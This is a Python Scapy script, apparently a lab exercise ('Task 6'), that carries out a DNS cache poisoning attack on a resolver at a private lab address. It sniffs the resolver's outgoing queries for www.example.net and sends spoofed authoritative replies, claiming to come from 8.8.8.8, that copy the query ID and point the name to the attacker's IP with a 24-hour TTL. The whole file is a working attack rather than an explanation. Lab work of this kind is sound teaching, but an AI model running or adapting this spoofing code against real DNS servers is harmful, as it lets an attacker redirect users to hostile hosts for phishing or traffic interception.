#!/usr/bin/env python3
"""
Task 6: DNS Cache Poisoning Attack
This script poisons the DNS server's cache by sending fake responses.
"""

from scapy.all import *
import random

# Configuration
DNS_SERVER_IP = "10.9.0.16"
ATTACKER_IP = "10.9.0.17"
FAKE_IP = "10.9.0.17"
TARGET_DOMAIN = "www.example.net"

# DNS uses port 33333 (configured in named.conf.options)
DNS_SRC_PORT = 33333

def poison_dns_cache(pkt):
    """
    Intercept DNS query from local DNS server and send fake response
    """
    if DNS in pkt and pkt[DNS].qr == 0:  # DNS query
        query_name = pkt[DNS].qd.qname.decode('utf-8')

        if TARGET_DOMAIN in query_name:
            print(f"[+] Intercepted DNS query from server: {query_name}")
            print(f"[+] Query ID: {pkt[DNS].id}")
            print(f"[+] Poisoning cache with IP: {FAKE_IP}")

            # Create fake response - race against real DNS server
            ip = IP(dst=DNS_SERVER_IP, src="8.8.8.8")  # Pretend to be Google DNS
            udp = UDP(dport=DNS_SRC_PORT, sport=53)

            # Create DNS response with our fake data
            dns = DNS(
                id=pkt[DNS].id,  # Match the query ID
                qr=1,            # Response
                aa=1,            # Authoritative
                qd=pkt[DNS].qd,  # Echo the question
                an=DNSRR(
                    rrname=pkt[DNS].qd.qname,
                    ttl=86400,   # Cache for 24 hours
                    rdata=FAKE_IP
                )
            )

            # Send multiple spoofed responses to increase chances
            spoofed_pkt = ip/udp/dns
            for i in range(10):
                send(spoofed_pkt, verbose=0)

            print(f"[+] Sent 10 spoofed responses!")
            print(f"[!] Check DNS cache with: rndc dumpdb -cache")
            print("-" * 60)

print("=" * 60)
print("Task 6: DNS Cache Poisoning Attack")
print("=" * 60)
print(f"Target Domain: {TARGET_DOMAIN}")
print(f"Fake IP: {FAKE_IP}")
print(f"Listening for DNS queries from server {DNS_SERVER_IP}...")
print()
print("Now trigger a query from user machine:")
print(f"  docker exec -it user-machine dig {TARGET_DOMAIN}")
print("=" * 60)
print()

# Sniff DNS queries from local DNS server going out
sniff(filter=f"udp src port {DNS_SRC_PORT} and dst port 53", prn=poison_dns_cache)
